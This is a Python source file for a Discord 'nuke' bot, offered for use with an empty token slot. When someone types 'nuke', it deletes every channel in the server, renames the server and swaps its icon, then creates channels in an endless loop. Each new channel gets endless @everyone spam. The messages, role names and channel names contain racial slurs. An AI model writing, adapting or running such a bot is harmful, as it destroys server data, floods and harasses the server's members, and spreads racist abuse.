#Made by spidermanfromearth69reboot

import discord
import asyncio

bot = discord.Client(intents=discord.Intents.all())
client = discord.client
@bot.event
async def on_ready():

        guild_count = 0

        for guild in bot.guilds:
                print(f"- {guild.id} (name: {guild.name}) (id: {guild.id}) (Owner: {guild.owner})")
                guild_count = guild_count + 1

        print("Nuke is in " + str(guild_count) + " guilds.")

@bot.event
async def on_guild_channel_create(channel):
        while True:
                await channel.send("@everyone fucked up nigga, https://cdn.discordapp.com/attachments/1172512620503375904/1185953746220490883/lv_0_20231217173635.gif?ex=65917c7f&is=657f077f&hm=ccc0957c62487bd90e22e2859909744eb1e19c77b5537583099490f0ccd072ac&")

@bot.event
async def on_message(message):
        if message.content == "nuke":
                guild = message.guild
                with open('UAR.jpg', 'rb') as f: icon = f.read()
                await message.channel.send("k nigger")
                for channel in guild.channels:
                        await channel.delete()
                await guild.edit(name="Fucked by UAR",icon=icon)
                await guild.create_role(name = "FUCKED BY NIGG")
                while True:
                        channel = await guild.create_text_channel('[fucked-by-the-EEE]')


bot.run("") #token here